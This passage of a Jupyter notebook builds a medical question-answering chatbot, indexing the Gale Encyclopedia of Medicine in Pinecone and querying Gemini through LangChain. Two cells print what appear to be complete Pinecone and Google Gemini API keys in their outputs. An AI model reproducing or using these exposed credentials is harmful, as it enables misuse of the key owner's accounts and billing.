      "  embeddings = HuggingFaceEmbeddings(model_name=\"sentence-transformers/all-MiniLM-L6-v2\", model_kwargs={'device':'cpu'})\n"
     ]
    }
   ],
   "source": [
    "embeddings = download_hugging_face_embedding_model()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "d6782b0f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "384\n"
     ]
    }
   ],
   "source": [
    "query_result = embeddings.embed_query(\"Hello World\")\n",
    "print(len(query_result))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "f5614500",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "pcsk_3HtRed_7v8Lo1bcgNHfQLwHmNA7yWTFrpXBJKLBpynEhhCzKHrkBTqXCS1FN4KVr3Xxk1q\n"
     ]
    }
   ],
   "source": [
    "pinecone_api = os.getenv('PINECONE_API_KEY')\n",
    "print(pinecone_api)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "f0b07ff0",
   "metadata": {},
   "outputs": [],
   "source": [
    "pc = Pinecone(api_key=pinecone_api)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "7333eb87",
   "metadata": {},
   "outputs": [],
   "source": [
    "index_name = 'medical-bot'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 86,
   "id": "51ab70e8",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{\n",
       "    \"name\": \"medical-bot\",\n",
       "    \"metric\": \"cosine\",\n",
       "    \"host\": \"medical-bot-q23k3fb.svc.aped-4627-b74a.pinecone.io\",\n",
       "    \"spec\": {\n",
       "        \"serverless\": {\n",
       "            \"cloud\": \"aws\",\n",
       "            \"region\": \"us-east-1\"\n",
       "        }\n",
       "    },\n",
       "    \"status\": {\n",
       "        \"ready\": true,\n",
       "        \"state\": \"Ready\"\n",
       "    },\n",
       "    \"vector_type\": \"dense\",\n",
       "    \"dimension\": 384,\n",
       "    \"deletion_protection\": \"disabled\",\n",
       "    \"tags\": null\n",
       "}"
      ]
     },
     "execution_count": 86,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\n",
    "pc.create_index(\n",
    "    name=index_name,\n",
    "    dimension=384,\n",
    "    metric='cosine',\n",
    "    spec=ServerlessSpec(\n",
    "        cloud='aws',\n",
    "        region='us-east-1'\n",
    "    )\n",
    ")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 87,
   "id": "424b3ce2",
   "metadata": {},
   "outputs": [],
   "source": [
    "docs = PineconeVectorStore.from_documents(\n",
    "    documents=text_chunks,\n",
    "    index_name=index_name,\n",
    "    embedding=embeddings\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "a14c62ee",
   "metadata": {},
   "outputs": [],
   "source": [
    "docsearch = PineconeVectorStore.from_existing_index(\n",
    "    index_name=index_name,\n",
    "    embedding=embeddings\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "f7af9169",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<langchain_pinecone.vectorstores.PineconeVectorStore at 0x71807aa92870>"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "docsearch"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "7aa367dd",
   "metadata": {},
   "outputs": [],
   "source": [
    "retriever = docsearch.as_retriever(\n",
    "    search_type=\"similarity\",\n",
    "    search_kwargs={\"k\": 3}\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "7a0a6e2c",
   "metadata": {},
   "outputs": [],
   "source": [
    "retrieved_docs = retriever.invoke(\"What is Acne?\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "5bff8b09",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[Document(id='04f1818c-260b-4cbb-b41f-e9def56e39b3', metadata={'creationdate': '2006-10-16T20:19:33+02:00', 'creator': 'Adobe Acrobat 6.0', 'moddate': '2006-10-16T22:03:45+02:00', 'page': 55.0, 'page_label': '26', 'producer': 'PDFlib+PDI 6.0.3 (SunOS)', 'source': 'data/book.pdf', 'total_pages': 4505.0}, page_content='Researchers, Inc. Reproduced by permission.)\\n26 GALE ENCYCLOPEDIA OF MEDICINE\\nAcne'),\n",
       " Document(id='a37a9963-7135-48a0-98e2-6db7bd41eccd', metadata={'creationdate': '2006-10-16T20:19:33+02:00', 'creator': 'Adobe Acrobat 6.0', 'moddate': '2006-10-16T22:03:45+02:00', 'page': 55.0, 'page_label': '26', 'producer': 'PDFlib+PDI 6.0.3 (SunOS)', 'source': 'data/book.pdf', 'total_pages': 4505.0}, page_content='Sebaceous follicles— A structure found within the\\nskin that houses the oil-producing glands and hair\\nfollicles, where pimples form.\\nSebum— An oily skin moisturizer produced by\\nsebaceous glands.\\nTretinoin— A drug that works by increasing the\\nturnover (death and replacement) of skin cells.\\nAcne vulgaris affecting a woman’s face. Acne is the general\\nname given to a skin disorder in which the sebaceous glands\\nbecome inflamed.(Photograph by Biophoto Associates, Photo'),\n",
       " Document(id='24429926-1f13-4ec0-9474-3c165262af3c', metadata={'creationdate': '2006-10-16T20:19:33+02:00', 'creator': 'Adobe Acrobat 6.0', 'moddate': '2006-10-16T22:03:45+02:00', 'page': 54.0, 'page_label': '25', 'producer': 'PDFlib+PDI 6.0.3 (SunOS)', 'source': 'data/book.pdf', 'total_pages': 4505.0}, page_content='Pathological Stage and Recurrence in Radical\\nProstatectomy Cases.’’Journal of Urology (March\\n1998): 935-940.\\nNancy J. Nordenson\\nAcid reflux see Heartburn\\nAcidosis see Respiratory acidosis; Renal\\ntubular acidosis; Metabolic acidosis\\nAcne\\nDefinition\\nAcne is a common skin disease characterized by\\npimples on the face, chest, and back. It occurs when\\nthe pores of the skin become clogged with oil, dead\\nskin cells, and bacteria.\\nDescription\\nAcne vulgaris, the medical term for common acne,')]"
      ]
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "retrieved_docs"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "46a72712",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "AIzaSyCrA3e8g2g3HIzA7SdxZnBeqNV0j0EtW24\n"
     ]
    }
   ],
   "source": [
    "gemini_api_key = os.getenv('GEMINI_API_KEY')\n",
    "print(gemini_api_key)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "d391070c",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'https://generativelanguage.googleapis.com/v1beta/openai/'"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "gemini_base_url = os.getenv(\"GEMINI_BASE_URL\")\n",
    "gemini_base_url"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "6285fe7c",
   "metadata": {},
   "outputs": [],
   "source": [
    "system_prompt = (\n",
    "    \"\"\"\n",
    "    You are an assistant for question answering tasks. Use the following\n",
    "    pieces of retrieved context to answer the question. If you don't know the \n",
    "    answer, say that you don't know. Use three sentences maximum and keep the \n",
    "    answer concise.\n",
    "    {context}\n",
    "    \"\"\"\n",
    ")\n",
    "\n",
    "prompt = ChatPromptTemplate.from_messages(\n",
    "    [\n",
    "        (\"system\", system_prompt),\n",
    "        (\"human\", \"{input}\")\n",
    "    ]\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "7f2eb865",
   "metadata": {},
   "outputs": [],
   "source": [
    "llm = ChatGoogleGenerativeAI(\n",
    "    model=\"gemini-2.0-flash\",\n",
    "    temperature=0,\n",
    "    max_output_tokens=500,\n",
    "    google_api_key=gemini_api_key \n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "d994d4d4",
   "metadata": {},
   "outputs": [],
   "source": [
    "question_answer_chain = create_stuff_documents_chain(llm, prompt)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "id": "3b97c8a1",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "RunnableBinding(bound=RunnableBinding(bound=RunnableAssign(mapper={\n",
       "  context: RunnableLambda(format_docs)\n",
       "}), kwargs={}, config={'run_name': 'format_inputs'}, config_factories=[])\n",
       "| ChatPromptTemplate(input_variables=['context', 'input'], input_types={}, partial_variables={}, messages=[SystemMessagePromptTemplate(prompt=PromptTemplate(input_variables=['context'], input_types={}, partial_variables={}, template=\"\\n    You are an assistant for question answering tasks. Use the following\\n    pieces of retrieved context to answer the question. If you don't know the \\n    answer, say that you don't know. Use three sentences maximum and keep the \\n    answer concise.\\n    {context}\\n    \"), additional_kwargs={}), HumanMessagePromptTemplate(prompt=PromptTemplate(input_variables=['input'], input_types={}, partial_variables={}, template='{input}'), additional_kwargs={})])\n",
       "| ChatGoogleGenerativeAI(model='models/gemini-2.0-flash', google_api_key=SecretStr('**********'), temperature=0.0, max_output_tokens=500, client=<google.ai.generativelanguage_v1beta.services.generative_service.client.GenerativeServiceClient object at 0x71807a627aa0>, default_metadata=(), model_kwargs={})\n",
       "| StrOutputParser(), kwargs={}, config={'run_name': 'stuff_documents_chain'}, config_factories=[])"
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "question_answer_chain"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "84d649a6",
   "metadata": {},
   "outputs": [],
   "source": [
    "rag_chain = create_retrieval_chain(retriever, question_answer_chain)\n",
    "\n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "id": "216c90f1",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Acromegaly is a rare disorder characterized by the abnormal release of a chemical from the pituitary gland in the brain. This leads to increased growth in bone and soft tissue, along with other disturbances throughout the body. It affects both men and women, with diagnosis often delayed until middle age due to the gradual onset of symptoms.\n"
     ]
    }
   ],
   "source": [
    "response = rag_chain.invoke({\"input\": \"What is Acromegaly?\"})\n",
    "print(response['answer'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "005098ae",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
